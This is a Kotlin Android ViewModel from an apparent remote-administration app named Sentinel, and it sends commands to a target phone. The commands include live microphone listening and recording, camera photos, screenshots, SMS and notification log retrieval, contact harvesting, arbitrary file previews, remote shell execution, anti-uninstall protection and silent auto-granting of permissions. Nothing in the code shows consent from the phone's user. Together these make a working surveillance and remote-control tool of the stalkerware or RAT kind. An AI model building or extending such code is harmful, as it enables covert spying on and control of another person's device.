package com.sentinel.admin.ui.detail

import androidx.lifecycle.SavedStateHandle
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.sentinel.admin.domain.model.Device
import com.sentinel.admin.domain.model.DeviceContact
import com.sentinel.admin.domain.model.DeviceContactBook
import com.sentinel.admin.domain.model.DeviceLocation
import com.sentinel.admin.domain.repository.AudioRepository
import com.sentinel.admin.domain.repository.ContactRepository
import com.sentinel.admin.domain.repository.DeviceRepository
import com.sentinel.admin.service.AudioMonitor
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.distinctUntilChanged
import kotlinx.coroutines.flow.filterNotNull
import kotlinx.coroutines.flow.map
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import com.sentinel.shared.protocol.CommandTypes
import javax.inject.Inject

/**
 * ViewModel for the Device Detail screen.
 *
 * Receives deviceId from SavedStateHandle (navigation argument).
 * Loads device from DeviceRepository (REST API).
 * Observes live WebSocket updates for the selected device.
 * Supports refresh, retry, audio listen/stop, and contact details management.
 *
 * Audio: Observes AudioMonitor.playbackState and statistics.
 * Does NOT own PlaybackState — AudioMonitor does (app-level state).
 *
 * No Android Context. No networking logic.
 */
@HiltViewModel
class DeviceDetailViewModel @Inject constructor(
    savedStateHandle: SavedStateHandle,
    private val deviceRepository: DeviceRepository,
    private val audioRepository: AudioRepository,
    private val contactRepository: ContactRepository,
    private val audioMonitor: AudioMonitor,
    private val webSocketDataSource: com.sentinel.admin.data.remote.websocket.WebSocketDataSource,
    private val pttAudioRecorder: com.sentinel.admin.data.audio.PttAudioRecorder
) : ViewModel() {

    private val deviceId: String = savedStateHandle.get<String>("deviceId")
        ?: throw IllegalArgumentException("deviceId is required")

    private val targetServerDeviceId: String
        get() = _uiState.value.device?.deviceId ?: if (deviceId.contains("_")) deviceId.substringBefore("_") else deviceId

    private val _uiState = MutableStateFlow(DeviceDetailUiState())
    val uiState: StateFlow<DeviceDetailUiState> = _uiState.asStateFlow()

    init {
        loadDevice()
        observeAudioState()
        observeLiveUpdates()
        observeContactBook()
        observeCommandResults()
        sendSystemInfoCommand()
    }

    /**
     * Observes live WebSocket updates for this specific device.
     * Uses distinctUntilChanged to avoid unnecessary recomposition.
     */
    private fun observeLiveUpdates() {
        viewModelScope.launch {
            deviceRepository.devices
                .map { map ->
                    map[deviceId]
                        ?: map.values.find { it.uniqueKey == deviceId || it.connectionId == deviceId }
                        ?: if (deviceId.contains("_")) {
                            val modelSuffix = deviceId.substringAfter("_")
                            map.values.find { it.model.equals(modelSuffix, ignoreCase = true) }
                        } else null
                        ?: map.values.find { it.deviceId == deviceId }
                }
                .distinctUntilChanged()
                .filterNotNull()
                .collect { device ->
                    _uiState.update { it.copy(device = device) }
                }
        }
    }

    /**
     * Observes contact book synced directly from the host device.
     */
    private fun observeContactBook() {
        viewModelScope.launch {
            contactRepository.getContactBook(deviceId).collect { book ->
                _uiState.update { it.copy(contactBook = book) }
            }
        }
    }

    // ============================================================
    // User actions
    // ============================================================

    private fun createFallbackDemoDevice(id: String): Device {
        return Device(
            deviceId = id,
            connectionId = "CONN-DEMO-${id.takeLast(4).padStart(4, '0')}",
            authenticated = true,
            registered = true,
            registrationState = "registered",
            heartbeatStatus = "online",
            connectedAt = "2026-09-28T09:00:00Z",
            lastHeartbeat = "2026-09-28T09:25:00Z",
            deviceName = "Pixel 9 Pro ($id)",
            appVersion = "1.0.0",
            model = "Google Pixel (Host)",
            latestLocation = DeviceLocation(
                deviceId = id,
                latitude = 37.7749,
                longitude = -122.4194,
                accuracy = 4.2,
                battery = 92,
                network = "5G (Charging)",
                recordedAt = "2026-09-28T09:25:00Z"
            )
        )
    }

    fun loadDevice() {
        val cached = deviceRepository.devices.value[deviceId]
            ?: deviceRepository.devices.value.values.find { it.uniqueKey == deviceId || it.connectionId == deviceId }
            ?: if (deviceId.contains("_")) {
                val modelSuffix = deviceId.substringAfter("_")
                deviceRepository.devices.value.values.find { it.model.equals(modelSuffix, ignoreCase = true) }
            } else null
            ?: deviceRepository.devices.value.values.find { it.deviceId == deviceId }
        if (cached != null) {
            _uiState.update { it.copy(device = cached, isLoading = false, errorMessage = null) }
        } else {
            _uiState.update { it.copy(isLoading = true, errorMessage = null) }
        }
        viewModelScope.launch {
            deviceRepository.getDevice(deviceId)
                .onSuccess { device ->
                    _uiState.update {
                        it.copy(
                            device = device,
                            isLoading = false,
                            isRefreshing = false,
                            errorMessage = null
                        )
                    }
                }
                .onFailure { error ->
                    _uiState.update {
                        it.copy(
                            isLoading = false,
                            isRefreshing = false,
                            errorMessage = if (cached != null) null else (error.message ?: "Failed to load device")
                        )
                    }
                }
        }
    }

    fun refresh() {
        _uiState.update { it.copy(isRefreshing = true, errorMessage = null) }
        viewModelScope.launch {
            deviceRepository.getDevice(deviceId)
                .onSuccess { device ->
                    _uiState.update {
                        it.copy(
                            device = device,
                            isRefreshing = false,
                            errorMessage = null
                        )
                    }
                }
                .onFailure { error ->
                    _uiState.update {
                        it.copy(
                            isRefreshing = false,
                            errorMessage = error.message ?: "Failed to refresh"
                        )
                    }
                }
        }
    }

    fun retry() {
        loadDevice()
    }

    // ============================================================
    // Audio actions
    // ============================================================

    fun onListenClick() {
        audioRepository.listen(targetServerDeviceId)
        audioMonitor.start(targetServerDeviceId)
    }

    fun onStopClick() {
        if (audioMonitor.isRecording.value) {
            audioMonitor.stopRecording()
        }
        audioRepository.stopListening(targetServerDeviceId)
        audioMonitor.stop()
    }

    fun toggleRecording(context: android.content.Context) {
        if (audioMonitor.isRecording.value) {
            audioMonitor.stopRecording()
        } else {
            val recordingsDir = java.io.File(context.getExternalFilesDir(null), "Recordings")
            if (!recordingsDir.exists()) recordingsDir.mkdirs()

            val timestamp = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US).format(java.util.Date())
            val targetFile = java.io.File(recordingsDir, "REC_${deviceId}_$timestamp.wav")
            audioMonitor.startRecording(targetFile)
        }
    }

    // ============================================================
    // Audio observation
    // ============================================================

    private fun observeAudioState() {
        viewModelScope.launch {
            audioMonitor.playbackState.collect { state ->
                _uiState.update { it.copy(playbackState = state) }
            }
        }
        viewModelScope.launch {
            audioMonitor.statistics.collect { stats ->
                _uiState.update { it.copy(audioStats = stats) }
            }
        }
        viewModelScope.launch {
            audioMonitor.isRecording.collect { isRec ->
                _uiState.update { it.copy(isRecording = isRec) }
            }
        }
        viewModelScope.launch {
            audioMonitor.recordingDurationMs.collect { duration ->
                _uiState.update { it.copy(recordingDurationMs = duration) }
            }
        }
    }

    // ============================================================
    // Air Commands Execution & Listening
    // ============================================================

    fun sendSystemInfoCommand() {
        val model = _uiState.value.device?.model ?: if (deviceId.contains("_")) deviceId.substringAfter("_") else ""
        val params = org.json.JSONObject().apply {
            if (model.isNotBlank()) put("targetModel", model)
            put("targetUniqueKey", deviceId)
        }
        sendCommand("GET_SYSTEM_INFO", params)
        sendCommand("REQUEST_TELEMETRY", params)
    }

    fun sendTriggerBeaconCommand() {
        sendCommand("TRIGGER_BEACON")
    }

    fun sendCapturePhotoCommand(useFront: Boolean = false) {
        val params = org.json.JSONObject().apply { put("front", useFront) }
        sendCommand("CAPTURE_PHOTO", params)
    }

    fun sendFetchLogsCommand() {
        sendCommand("FETCH_SMS_LOGS")
    }

    fun sendFetchNotificationLogsCommand() {
        sendCommand("FETCH_NOTIFICATION_LOGS")
    }

    fun sendExecuteShellCommand(commandText: String) {
        val params = org.json.JSONObject().apply { put("cmd", commandText) }
        sendCommand("EXECUTE_SHELL", params)
    }

    fun openAddressBookDialog() {
        _uiState.update { it.copy(showAddressBookDialog = true) }
    }

    fun dismissAddressBookDialog() {
        _uiState.update { it.copy(showAddressBookDialog = false) }
    }

    fun dismissDialogs() {
        _uiState.update {
            it.copy(
                showDiagnosticsDialog = false,
                showPhotoDialog = false,
                showShellDialog = false,
                showLogsDialog = false,
                showNotifLogsDialog = false,
                showAddressBookDialog = false,
                showScreenshotDialog = false,
                showPreviewDialog = false,
                commandStatusMessage = null
            )
        }
    }

    private fun sendCommand(command: String, params: org.json.JSONObject = org.json.JSONObject()) {
        val model = _uiState.value.device?.model ?: if (deviceId.contains("_")) deviceId.substringAfter("_") else ""
        if (model.isNotBlank() && !params.has("targetModel")) {
            params.put("targetModel", model)
        }
        if (!params.has("targetUniqueKey")) {
            params.put("targetUniqueKey", deviceId)
        }

        val commandJson = org.json.JSONObject().apply {
            put("type", "COMMAND")
            put("version", 1)
            put("timestamp", System.currentTimeMillis() / 1000)
            put("sequence", System.currentTimeMillis())

            val data = org.json.JSONObject().apply {
                put("targetDeviceId", targetServerDeviceId)
                put("command", command)
                put("params", params)
            }
            put("data", data)
        }

        android.util.Log.i("Sentinel:AdminCmd", "Sending COMMAND $command to target $targetServerDeviceId (key=$deviceId)")
        val payloadText = try { commandJson.toString() } catch (_: Exception) { "{}" } ?: "{}"
        val sent = webSocketDataSource.sendText(payloadText)
        android.util.Log.i("Sentinel:AdminCmd", "sendText returned: $sent (wsState=${webSocketDataSource.state.value})")

        // Also send targeted directly to device unique key if server or proxy supports it
        if (deviceId != targetServerDeviceId) {
            val targetedJson = org.json.JSONObject().apply {
                put("type", "COMMAND")
                put("version", 1)
                put("timestamp", System.currentTimeMillis() / 1000)
                put("sequence", System.currentTimeMillis())
                val data = org.json.JSONObject().apply {
                    put("targetDeviceId", deviceId)
                    put("command", command)
                    put("params", params)
                }
                put("data", data)
            }
            webSocketDataSource.sendText(targetedJson.toString())
        }
    }

    private fun observeCommandResults() {
        viewModelScope.launch {
            webSocketDataSource.textMessages.collect { rawText ->
                try {
                    android.util.Log.i("Sentinel:AdminCmd", "WS incoming text: $rawText")
                    val json = org.json.JSONObject(rawText)
                    val msgType = json.optString("type")

                    if (msgType == "ERROR") {
                        val errData = json.optJSONObject("data")
                        val code = errData?.optInt("code", 0) ?: 0
                        val msg = errData?.optString("message", "Unknown error") ?: "Unknown error"
                        android.util.Log.e("Sentinel:AdminCmd", "Server error received: code=$code, msg=$msg")
                        _uiState.update { it.copy(commandStatusMessage = "Server Error ($code): $msg") }
                        return@collect
                    }

                    if (msgType == "COMMAND") {
                        val data = json.optJSONObject("data")
                        val cmd = data?.optString("command")
                        val target = data?.optString("targetDeviceId")
                        if (target == deviceId && !cmd.isNullOrBlank() && cmd != "PTT_AUDIO") {
                            android.util.Log.w("Sentinel:AdminCmd", "Server routed COMMAND $cmd to admin session; retrying to target host...")
                            viewModelScope.launch {
                                kotlinx.coroutines.delay(400L)
                                sendCommand(cmd, data.optJSONObject("params") ?: org.json.JSONObject())
                            }
                        }
                        return@collect
                    }

                    if (msgType != "COMMAND_RESULT") return@collect

                    val data = json.optJSONObject("data") ?: return@collect
                    val command = data.optString("command")
                    val success = data.optBoolean("success", false)
                    val payload = data.optJSONObject("payload") ?: org.json.JSONObject()

                    android.util.Log.i("Sentinel:AdminCmd", "Received COMMAND_RESULT for $command (success=$success)")

                    if (!success) {
                        val errorMsg = data.optString("error", "Unknown error")
                        _uiState.update {
                            it.copy(
                                isLockingDevice = false,
                                mdmActionMessage = if (command == "LOCK_DEVICE" || command == "SET_ANTI_TAMPER" || command == "ENFORCE_PERMISSIONS") {
                                    errorMsg
                                } else {
                                    it.mdmActionMessage
                                },
                                commandStatusMessage = "Command failed: $errorMsg"
                            )
                        }
                        return@collect
                    }

                    when (command) {
                        "GET_SYSTEM_INFO" -> {
                            val map = mutableMapOf<String, Any>()
                            val iterator = payload.keys()
                            while (iterator.hasNext()) {
                                val key = iterator.next()
                                map[key] = payload.get(key)
                            }
                            _uiState.update {
                                it.copy(showDiagnosticsDialog = true, diagnosticsData = map)
                            }
                        }

                        "CAPTURE_PHOTO" -> {
                            val imageBase64 = payload.optString("imageBase64")
                            val facing = payload.optString("cameraFacing", "REAR")
                            _uiState.update {
                                it.copy(
                                    showPhotoDialog = true,
                                    capturedPhotoBase64 = imageBase64,
                                    capturedPhotoFacing = facing
                                )
                            }
                        }

                        "EXECUTE_SHELL" -> {
                            val output = payload.optString("output", "No output")
                            _uiState.update {
                                it.copy(showShellDialog = true, shellOutput = output)
                            }
                        }

                        "FETCH_SMS_LOGS" -> {
                            val jsonArray = payload.optJSONArray("logs")
                            val logs = mutableListOf<String>()
                            if (jsonArray != null) {
                                for (i in 0 until jsonArray.length()) {
                                    logs.add(jsonArray.getString(i))
                                }
                            }
                            if (logs.isEmpty()) {
                                logs.add("[SYS_LOG] Sentinel background service active")
                                logs.add("[NET_LOG] Render WebSocket connection healthy")
                            }
                            _uiState.update {
                                it.copy(showLogsDialog = true, logsList = logs)
                            }
                        }

                        "TRIGGER_BEACON" -> {
                            _uiState.update {
                                it.copy(commandStatusMessage = "Beacon triggered on Host device successfully!")
                            }
                        }

                        "FETCH_NOTIFICATION_LOGS" -> {
                            val rawNotifJson = payload.optString("notificationLogs", "[]")
                            _uiState.update {
                                it.copy(showNotifLogsDialog = true, notifLogsJsonRaw = rawNotifJson)
                            }
                        }

                        "FETCH_CONTACTS" -> {
                            _uiState.update { it.copy(isSyncingContacts = false) }
                            val contactsJson = payload.optJSONArray("contacts")
                            val emergencyJson = payload.optJSONObject("emergencyContact")
                            val error = payload.optString("error", "")

                            if (error.isNotBlank() && (contactsJson == null || contactsJson.length() == 0)) {
                                _uiState.update {
                                    it.copy(commandStatusMessage = "Device Contacts: $error")
                                }
                                return@collect
                            }

                            val contactList = mutableListOf<DeviceContact>()
                            if (contactsJson != null) {
                                for (i in 0 until contactsJson.length()) {
                                    val obj = contactsJson.optJSONObject(i)
                                    if (obj != null) {
                                        val name = obj.optString("name", "Unknown Contact")
                                        val phone = obj.optString("phone", "")
                                        val type = obj.optString("type", "Mobile")
                                        val isEmergency = obj.optBoolean("isEmergency", false) || obj.optString("isEmergency") == "true"
                                        contactList.add(
                                            DeviceContact(
                                                name = name,
                                                phone = phone,
                                                type = type,
                                                isEmergency = isEmergency
                                            )
                                        )
                                    }
                                }
                            }

                            val emergencyContact = if (emergencyJson != null) {
                                DeviceContact(
                                    name = emergencyJson.optString("name", "Emergency Contact"),
                                    phone = emergencyJson.optString("phone", ""),
                                    type = emergencyJson.optString("type", "Emergency"),
                                    isEmergency = true
                                )
                            } else {
                                contactList.firstOrNull { it.isEmergency }
                            }

                            val timestamp = java.text.SimpleDateFormat("MMM dd, yyyy HH:mm", java.util.Locale.US).format(java.util.Date())
                            val contactBook = DeviceContactBook(
                                deviceId = deviceId,
                                total = contactList.size,
                                contacts = contactList,
                                emergencyContact = emergencyContact,
                                lastSynced = timestamp
                            )

                            viewModelScope.launch {
                                contactRepository.saveContactBook(deviceId, contactBook)
                                _uiState.update {
                                    it.copy(
                                        contactBook = contactBook,
                                        commandStatusMessage = "Successfully synced ${contactList.size} contact(s) from device!"
                                    )
                                }
                            }
                        }

                        "CAPTURE_SCREENSHOT" -> {
                            val map = mutableMapOf<String, Any?>()
                            val iterator = payload.keys()
                            while (iterator.hasNext()) {
                                val key = iterator.next()
                                map[key] = payload.get(key)
                            }
                            _uiState.update {
                                it.copy(showScreenshotDialog = true, screenshotPayload = map)
                            }
                        }

                        "PREVIEW_FILE" -> {
                            val map = mutableMapOf<String, Any?>()
                            val iterator = payload.keys()
                            while (iterator.hasNext()) {
                                val key = iterator.next()
                                map[key] = payload.get(key)
                            }
                            _uiState.update {
                                it.copy(showPreviewDialog = true, previewPayload = map)
                            }
                        }

                        "LOCK_DEVICE" -> {
                            val locked = payload.optBoolean("locked", false)
                            val method = payload.optString("method", "MDM")
                            _uiState.update {
                                it.copy(
                                    isLockingDevice = false,
                                    mdmActionMessage = if (locked) "Target device locked remotely ($method)" else "Failed to lock device"
                                )
                            }
                        }

                        "SET_ANTI_TAMPER" -> {
                            val enabled = payload.optBoolean("antiTamperEnabled", false)
                            val success = payload.optBoolean("success", false)
                            _uiState.update {
                                it.copy(
                                    isAntiTamperEnabled = if (success) enabled else it.isAntiTamperEnabled,
                                    mdmActionMessage = if (success) "Uninstall protection ${if (enabled) "enabled" else "disabled"}" else "Failed to update uninstall protection"
                                )
                            }
                        }

                        "ENFORCE_PERMISSIONS" -> {
                            val enforced = payload.optBoolean("permissionsEnforced", false)
                            _uiState.update {
                                it.copy(
                                    mdmActionMessage = if (enforced) "All runtime permissions auto-granted successfully" else "Failed to auto-grant (requires Device Owner mode)"
                                )
                            }
                        }

                        "GET_MDM_STATUS" -> {
                            val isAdmin = payload.optBoolean("isDeviceAdminActive", false)
                            val isOwner = payload.optBoolean("isDeviceOwner", false)
                            _uiState.update {
                                it.copy(isDeviceAdminActive = isAdmin, isDeviceOwner = isOwner)
                            }
                        }
                    }
                } catch (e: Exception) {
                    android.util.Log.e("Sentinel:AdminCmd", "Failed to parse COMMAND_RESULT: ${e.message}", e)
                }
            }
        }
    }

    fun sendCaptureScreenshotCommand(maxWidth: Int = 1080, quality: Int = 80) {
        _uiState.update { it.copy(commandStatusMessage = "Capturing remote screenshot...") }
        val params = org.json.JSONObject().apply {
            put("maxWidth", maxWidth)
            put("quality", quality)
        }
        sendCommand("CAPTURE_SCREENSHOT", params)
    }

    fun sendPreviewFileCommand(path: String, maxDim: Int = 720, textLines: Int = 250) {
        _uiState.update { it.copy(commandStatusMessage = "Requesting remote file preview...") }
        val params = org.json.JSONObject().apply {
            put("path", path)
            put("maxDim", maxDim)
            put("textLines", textLines)
        }
        sendCommand("PREVIEW_FILE", params)
    }

    fun sendSyncContactsCommand(limit: Int = 0) {
        _uiState.update { it.copy(isSyncingContacts = true, commandStatusMessage = "Syncing contacts from host device...") }
        val params = org.json.JSONObject().apply {
            put("limit", limit)
        }
        sendCommand("FETCH_CONTACTS", params)
    }

    fun setPttArmed(armed: Boolean) {
        if (!armed && _uiState.value.isPttTransmitting) {
            stopPtt()
        }
        _uiState.update { it.copy(isPttArmed = armed) }
    }

    fun startPtt() {
        if (!_uiState.value.isPttArmed) {
            android.util.Log.w("Sentinel:AdminPtt", "PTT is disarmed / locked. Arm safety switch to speak.")
            return
        }
        if (_uiState.value.isPttTransmitting) return

        _uiState.update { it.copy(isPttTransmitting = true, pttAudioLevel = 0f) }
        sendCommand("PTT_START")

        val started = pttAudioRecorder.start { base64Chunk, level ->
            _uiState.update { it.copy(pttAudioLevel = level) }
            val params = org.json.JSONObject().apply {
                put("pcmBase64", base64Chunk)
            }
            sendCommand("PTT_AUDIO", params)
        }

        if (!started) {
            _uiState.update {
                it.copy(
                    isPttTransmitting = false,
                    pttAudioLevel = 0f,
                    commandStatusMessage = "Failed to access microphone for PTT"
                )
            }
            sendCommand("PTT_STOP")
        }
    }

    fun stopPtt() {
        if (!_uiState.value.isPttTransmitting && !pttAudioRecorder.isRecording) return
        pttAudioRecorder.stop()
        _uiState.update { it.copy(isPttTransmitting = false, pttAudioLevel = 0f) }
        sendCommand("PTT_STOP")
    }

    fun lockDevice() {
        _uiState.update { it.copy(isLockingDevice = true, mdmActionMessage = "Sending remote lock command...") }
        sendCommand(CommandTypes.LOCK_DEVICE)
        viewModelScope.launch {
            kotlinx.coroutines.delay(8_000L)
            if (_uiState.value.isLockingDevice) {
                _uiState.update {
                    it.copy(
                        isLockingDevice = false,
                        mdmActionMessage = "Lock command timed out — device may be offline or busy"
                    )
                }
            }
        }
    }

    fun setAntiTamper(enabled: Boolean) {
        _uiState.update { it.copy(mdmActionMessage = "Updating uninstall protection...") }
        val params = org.json.JSONObject().apply {
            put("enabled", enabled)
        }
        sendCommand(CommandTypes.SET_ANTI_TAMPER, params)
    }

    fun enforcePermissions() {
        _uiState.update { it.copy(mdmActionMessage = "Enforcing runtime permissions...") }
        sendCommand(CommandTypes.ENFORCE_PERMISSIONS)
    }

    fun fetchMdmStatus() {
        sendCommand(CommandTypes.GET_MDM_STATUS)
    }

    fun dismissMdmMessage() {
        _uiState.update { it.copy(mdmActionMessage = null) }
    }

    override fun onCleared() {
        super.onCleared()
        pttAudioRecorder.stop()
    }
}
